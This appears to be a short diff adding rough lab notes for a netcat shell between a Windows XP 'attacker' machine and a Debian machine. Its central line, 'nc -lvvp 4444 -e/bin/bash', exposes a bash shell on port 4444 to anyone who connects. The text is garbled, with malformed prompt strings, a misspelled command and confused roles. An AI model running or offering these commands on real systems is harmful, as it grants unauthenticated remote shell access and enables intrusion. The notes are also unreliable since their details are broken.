@@ -1,0 +1,6 @@
+windxp is attacker
+c://nc111nt>ipcofig
+c://nc111nt>nc -lvvp 4444
+ deb machine
+apt-get install netcat
+nc -lvvp 4444 -e/bin/bash
